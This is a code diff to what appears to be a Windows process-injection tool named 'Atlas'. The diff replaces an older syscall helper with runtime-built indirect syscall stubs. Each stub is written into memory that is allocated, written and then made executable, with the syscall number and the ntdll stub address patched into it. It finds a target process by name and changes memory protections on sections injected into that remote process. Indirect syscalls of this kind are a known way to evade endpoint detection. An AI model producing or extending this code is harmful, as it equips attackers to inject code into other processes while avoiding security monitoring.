@@ -9,10 +9,14 @@ void ErrorCallback(const char* msg, DWORD lastError, NTSTATUS status, ATLAS_UTIL
     }
 
     if(freeMem){
-        SysPrepare(atlas_utils->atlas_syscalls.NtFreeVirtualMemorySSN, atlas_utils->atlas_syscalls.NtFreeVirtualMemoryAddr);
-        if(!NT_SUCCESS(SysInvoke(target_data->hRemote, &target_data->pTargetAddr, &target_data->imageSize, MEM_RELEASE))){
+        fnNtFreeVirtualMemory sysInvoke = (fnNtFreeVirtualMemory)C_SyscallPrepare(atlas_utils, atlas_utils->atlas_syscalls.NtFreeVirtualMemory);
+
+        if(!NT_SUCCESS(sysInvoke(target_data->hRemote, &target_data->pTargetAddr, &target_data->imageSize, MEM_RELEASE))){
             printf("Error on free NTSTATUS: %lx", status);
         }
+
+        C_SyscallCleanup(atlas_utils, (PVOID)sysInvoke);
+
     }
 
     exit(EXIT_FAILURE);
@@ -23,17 +27,18 @@ DWORD FindTargetPid(LPCWSTR target, ATLAS_UTILS* atlas_utils){
     DWORD pid = 0;
     NTSTATUS status;
 
-    SysPrepare(atlas_utils->atlas_syscalls.NtQuerySystemInformationSSN, atlas_utils->atlas_syscalls.NtQuerySystemInformationAddr);
-    SysInvoke(SystemProcessInformation, NULL, 0, &returnLength);
+    fnNtQuerySystemInformation sysInvoke = (fnNtQuerySystemInformation)C_SyscallPrepare(atlas_utils, atlas_utils->atlas_syscalls.NtQuerySystemInformation);
+    sysInvoke(SystemProcessInformation, NULL, 0, &returnLength);
 
     PSYSTEM_PROCESS_INFORMATION pSpi = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)returnLength);
 
-    SysPrepare(atlas_utils->atlas_syscalls.NtQuerySystemInformationSSN, atlas_utils->atlas_syscalls.NtQuerySystemInformationAddr);
-    status = SysInvoke(SystemProcessInformation, pSpi, returnLength, NULL);
+    status = sysInvoke(SystemProcessInformation, pSpi, returnLength, NULL);
     
     if(!NT_SUCCESS(status)){
         ErrorCallback("PID find failed", 0, status, NULL, NULL, FALSE);
     }
+
+    C_SyscallCleanup(atlas_utils, (PVOID)sysInvoke);
 
     while(true){
         if(pSpi->ImageName.Length && wcscmp(target, pSpi->ImageName.Buffer) == 0){
@@ -149,6 +154,8 @@ void FixMemoryProtections(TARGET_DATA* target_data, DLL_DATA dll_data, ATLAS_UTI
 
     PIMAGE_SECTION_HEADER pSectionHeader = new IMAGE_SECTION_HEADER;
 
+    fnNtProtectVirtualMemory sysInvoke = (fnNtProtectVirtualMemory)C_SyscallPrepare(atlas_utils, atlas_utils->atlas_syscalls.NtProtectVirtualMemory);
+
     for(size_t i = 0; i < dll_data.fileHeader->NumberOfSections; i++){        
         DWORD_PTR sectionHeaderAddr = DWORD_PTR((DWORD_PTR)target_data->pTargetAddr + sectionHeaderOffset + i * sizeof(IMAGE_SECTION_HEADER));
   
@@ -181,13 +188,13 @@ void FixMemoryProtections(TARGET_DATA* target_data, DLL_DATA dll_data, ATLAS_UTI
             protection = PAGE_EXECUTE_READWRITE;
         }
 
-        SysPrepare(atlas_utils->atlas_syscalls.NtProtectVirtualMemorySSN, atlas_utils->atlas_syscalls.NtProtectVirtualMemoryAddr);
-        NTSTATUS status = SysInvoke(target_data->hRemote, &pSectionAddr, &sectionSize, protection, &oldProtection);
-
+        NTSTATUS status = sysInvoke(target_data->hRemote, &pSectionAddr, &sectionSize, protection, &oldProtection);
         if (!NT_SUCCESS(status)) {
             ErrorCallback("Memory protection failed", 0, status, atlas_utils, target_data, TRUE);
-        }      
+        }    
     }
+
+    C_SyscallCleanup(atlas_utils, (PVOID)sysInvoke);  
 }
 
 
@@ -257,6 +264,53 @@ size_t C_GetProcAddress(DLL_DATA dll_data, DWORD targetFuncHash, WORD ordinal){
     return -1;
 }
 
+PVOID C_SyscallPrepare(ATLAS_UTILS* atlas_utils, SYSCALL_INFO syscallInfo){
+    BYTE* stub = new BYTE[21]{
+        0x4C, 0x8B, 0xD1,
+        0xB8, 0x00, 0x00, 0x00, 0x00,
+        0x49, 0xBB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x41, 0xFF, 0xE3
+    }; 
+
+    ULONG stubSize = (22 * sizeof(BYTE)); 
+    SIZE_T regionSize = (22 * sizeof(BYTE));
+    
+    memcpy(&stub[4], &syscallInfo.ssn, sizeof(DWORD));
+    memcpy(&stub[10], &syscallInfo.stubAddr, sizeof(PVOID));
+
+    HANDLE currentHandle = GetCurrentProcess();
+
+    PVOID pBaseAddr = NULL;
+    NTSTATUS status;
+
+    status = atlas_utils->pNtAllocateVirtualMemory(currentHandle, &pBaseAddr, 0, &regionSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    if(!NT_SUCCESS(status)){
+        ErrorCallback("Allocation failed", 0, status, NULL, NULL, FALSE);
+    }
+
+    status = atlas_utils->pNtWriteVirtualMemory(currentHandle, pBaseAddr, (PVOID)(stub), stubSize, NULL); 
+    if(!NT_SUCCESS(status)){
+        ErrorCallback("Memory Write failed", 0, status, NULL, NULL, FALSE);
+    }
+
+    delete [] stub;
+
+    ULONG oldProtection = 0;
+    status = atlas_utils->pNtProtectVirtualMemory(currentHandle, &pBaseAddr, &regionSize, PAGE_EXECUTE_READ, &oldProtection);
+    if(!NT_SUCCESS(status)){
+        ErrorCallback("Memory protection failed", 0, status, NULL, NULL, FALSE);
+    }
+
+    return pBaseAddr;
+}
+
+VOID C_SyscallCleanup(ATLAS_UTILS* atlas_utils, PVOID pStubAddr){
+    SIZE_T size = 22; 
+    NTSTATUS status = atlas_utils->pNtFreeVirtualMemory(GetCurrentProcess(), &pStubAddr, &size, MEM_RELEASE);
+      if(!NT_SUCCESS(status)){
+        ErrorCallback("Cleanup failed", 0, status, NULL, NULL, FALSE);
+    }
+}
 
 
 void RetrieveDLL_DATA(PVOID pDllAddr, DLL_DATA* dll_data){
@@ -307,18 +361,36 @@ void RetrieveUtils(ATLAS_UTILS* atlas_utils){
         ErrorCallback("Retrieve of aux func 2 failed", GetLastError(), 0, NULL, NULL, FALSE);
     }
 
-    atlas_utils->atlas_syscalls.NtAllocateVirtualMemorySSN = C_RetrieveSSN(Sys_ZwAllocateVirtualMemory, dll_data);
-    atlas_utils->atlas_syscalls.NtProtectVirtualMemorySSN = C_RetrieveSSN(Sys_ZwProtectVirtualMemory, dll_data);
-    atlas_utils->atlas_syscalls.NtQuerySystemInformationSSN = C_RetrieveSSN(Sys_ZwQuerySystemInformation, dll_data);
-    atlas_utils->atlas_syscalls.NtCreateThreadExSSN = C_RetrieveSSN(Sys_ZwCreateThreadEx, dll_data);
-    atlas_utils->atlas_syscalls.NtFreeVirtualMemorySSN = C_RetrieveSSN(Sys_ZwFreeVirtualMemory, dll_data);
+    fnNtAllocateVirtualMemory pNtAllocateVirtualMemory = (fnNtAllocateVirtualMemory)C_GetProcAddress(dll_data, Sys_ZwAllocateVirtualMemory, NULL);
+    if(pNtAllocateVirtualMemory == NULL){
+        ErrorCallback("Retrieve of aux func 3 failed", GetLastError(), 0, NULL, NULL, FALSE);
+    }
 
-    atlas_utils->atlas_syscalls.NtAllocateVirtualMemoryAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwAllocateVirtualMemory, NULL));
-    atlas_utils->atlas_syscalls.NtProtectVirtualMemoryAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwProtectVirtualMemory, NULL));
-    atlas_utils->atlas_syscalls.NtQuerySystemInformationAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwQuerySystemInformation, NULL));
-    atlas_utils->atlas_syscalls.NtCreateThreadExAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwCreateThreadEx, NULL));
-    atlas_utils->atlas_syscalls.NtFreeVirtualMemoryAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwFreeVirtualMemory, NULL));
+    fnNtFreeVirtualMemory pNtFreeVirtualMemory = (fnNtFreeVirtualMemory)C_GetProcAddress(dll_data, Sys_ZwFreeVirtualMemory, NULL);
+    if(pNtFreeVirtualMemory == NULL){
+        ErrorCallback("Retrieve of aux func 4 failed", GetLastError(), 0, NULL, NULL, FALSE);
+    }
+
+    fnNtProtectVirtualMemory pNtProtectVirtualMemory = (fnNtProtectVirtualMemory)C_GetProcAddress(dll_data, Sys_ZwProtectVirtualMemory, NULL);
+    if(pNtProtectVirtualMemory == NULL){
+        ErrorCallback("Retrieve of aux func 5 failed", GetLastError(), 0, NULL, NULL, FALSE);
+    }
+
+    atlas_utils->atlas_syscalls.NtAllocateVirtualMemory.ssn = C_RetrieveSSN(Sys_ZwAllocateVirtualMemory, dll_data);
+    atlas_utils->atlas_syscalls.NtProtectVirtualMemory.ssn = C_RetrieveSSN(Sys_ZwProtectVirtualMemory, dll_data);
+    atlas_utils->atlas_syscalls.NtQuerySystemInformation.ssn = C_RetrieveSSN(Sys_ZwQuerySystemInformation, dll_data);
+    atlas_utils->atlas_syscalls.NtCreateThreadEx.ssn = C_RetrieveSSN(Sys_ZwCreateThreadEx, dll_data);
+    atlas_utils->atlas_syscalls.NtFreeVirtualMemory.ssn = C_RetrieveSSN(Sys_ZwFreeVirtualMemory, dll_data);
+
+    atlas_utils->atlas_syscalls.NtAllocateVirtualMemory.stubAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwAllocateVirtualMemory, NULL));
+    atlas_utils->atlas_syscalls.NtProtectVirtualMemory.stubAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwProtectVirtualMemory, NULL));
+    atlas_utils->atlas_syscalls.NtQuerySystemInformation.stubAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwQuerySystemInformation, NULL));
+    atlas_utils->atlas_syscalls.NtCreateThreadEx.stubAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwCreateThreadEx, NULL));
+    atlas_utils->atlas_syscalls.NtFreeVirtualMemory.stubAddr = C_RetrieveSyscallAddr(C_GetProcAddress(dll_data, Sys_ZwFreeVirtualMemory, NULL));
 
     atlas_utils->pLdrLoadDll = pLdrLoadDll;
     atlas_utils->pNtWriteVirtualMemory = pNtWriteVirtualMemory; 
+    atlas_utils->pNtAllocateVirtualMemory = pNtAllocateVirtualMemory;
+    atlas_utils->pNtFreeVirtualMemory = pNtFreeVirtualMemory;
+    atlas_utils->pNtProtectVirtualMemory = pNtProtectVirtualMemory;
 }
